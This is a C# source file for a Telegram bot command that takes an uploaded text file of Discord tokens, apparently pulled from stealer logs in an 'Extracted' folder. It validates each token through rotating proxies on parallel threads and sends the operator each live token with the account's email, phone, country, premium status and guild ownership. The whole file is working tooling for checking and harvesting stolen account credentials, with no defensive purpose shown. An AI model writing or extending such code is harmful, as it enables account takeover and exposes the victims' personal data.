using System.Text;

using Bot.Core.Models;
using Bot.Core.Models.Checkers.Abstractions;
using Bot.Core.Models.Commands.Abstractions;
using Bot.Core.Models.Commands.Base;
using Bot.Core.Models.Parsers.Abstractions;
using Bot.Services.Discord.Models;
using Bot.Services.Proxies.Services;

using Injectio.Attributes;

using Newtonsoft.Json;

using TL;

using WTelegram;

namespace Bot.Telegram.Commands.User.Services {
	[RegisterTransient<ICommand<UpdateNewMessage>>(ServiceKey = Keys.Services.Discord), RegisterTransient<ICommand<UpdateBotCallbackQuery>>(ServiceKey = Keys.Services.DiscordCallback)]
	public class Discord(Client client, Proxies proxies, IParserStream<Bot.Services.Discord.Models.User> parser, IChecker<Bot.Services.Discord.Models.User> checker, IConfiguration config, ILogger<Discord> logger) : BaseView(client) {
		public override Task<string> BuildMessage(UpdateNewMessage update, TL.User user) {
			if (update is not {message: Message {media: MessageMediaDocument {document: Document document}}}) {
				return Task.FromResult("File with tokens not found");
			}

			if (document.mime_type != "text/plain") {
				return Task.FromResult("File is not of type .txt");
			}

			return Task.FromResult($"Start processing: {document.Filename}");
		}

		protected override Task<ReplyInlineMarkup?> DefaultMarkup(object args, TL.User user) {
			return Task.FromResult<ReplyInlineMarkup?>(new() {
				rows = [
					new() {
						buttons = [
							Keys.Common.Dispose_Button
						]
					}
				]
			});
		}

		[Obsolete]
		public Task ExecuteAsync(UpdateBotCallbackQuery update, TL.User user) {
			var name = Encoding.UTF8.GetString(update.data[1..]);
			var path = Path.Combine(config["Files:Root"], "Extracted", name);
			
			Task.Factory.StartNew(
				async () => {
					if (!Directory.Exists(path)) {
						return;
					}

					logger.LogInformation("[Discord] Parsing tokens");
					var tokens = await parser.FromLogs(path).ToListAsync();
					
					logger.LogInformation("[Discord] Taking proxy");
					var proxy_list = await proxies.TakeAsync(int.Parse(config["Multithreading:Proxy:MaxThreads"]!)).ToListAsync();

					logger.LogInformation("[Discord] Start processing");
					tokens.WithThreads(
						int.Parse(config["Multithreading:Proxy:MaxThreads"]!),
						async (account, index) => {
							await using var proxy = proxy_list[index];

							using (var http = (HttpClient)proxy) {
								return await checker.CheckAsync(account, http) && await checker.DetailsAsync(account, http);
							}
						},
						async (account, _) => {
							var text = $$"""
										 {{account.Username}}

										 Token: `{{account.Token}}`
										 Email: {{(string.IsNullOrEmpty(account.Email) ? "None" : account.Email)}}
										 Phone: {{(string.IsNullOrEmpty(account.Phone) ? "None" : account.Phone)}}
										 Country: {{(string.IsNullOrEmpty(account.CountryCode) ? "Unknown" : account.CountryCode)}}
										 Verified: {{(account.Verified ? "True" : "False")}}
										 Premium: {{account.PremiumType.ToString()}}

										 Guilds: {{account.Guilds.Count}}
										 
										 {{string.Join('\n', account.Guilds.Select(x => $"\tName: {x.Name}\n\tStatus: {(x.IsOwner ? "Owner" : "Member")}\n"))}}
										 """;

#if DEBUG
							logger.LogDebug("[Discord] Try to send: \n{account}\n{content}", JsonConvert.SerializeObject(account, Formatting.Indented), text);
#endif
                            
							var entities = client.MarkdownToEntities(ref text);
							
							await client.SendMessageAsync(
								user,
								text,
								media: account.AvatarId is not null ? new InputMediaPhotoExternal {
									url = $"https://cdn.discordapp.com/avatars/{account.Id}/{account.AvatarId}.webp"
								} : null,
								entities: entities
							);
						}
					);
				}
			);

			if (!Directory.Exists(path)) {
				return client.Messages_EditMessage(
					user,
					update.msg_id,
					$"Directory not found: {name}",
					reply_markup: new ReplyInlineMarkup {
						rows = [
							new() {
								buttons = [
									new KeyboardButtonCallback {
										text = "Menu",
										data = [Keys.StartCallback]
									}
								]
							}
						]
					}
				);
			}

			return client.Messages_EditMessage(
				user,
				update.msg_id,
				$"Parsing from {name}",
				reply_markup: new ReplyInlineMarkup {
					rows = [
						new() {
							buttons = [
								new KeyboardButtonCallback {
									text = "Menu",
									data = [Keys.StartCallback]
								}
							]
						}
					]
				}
			);
		}
	}
}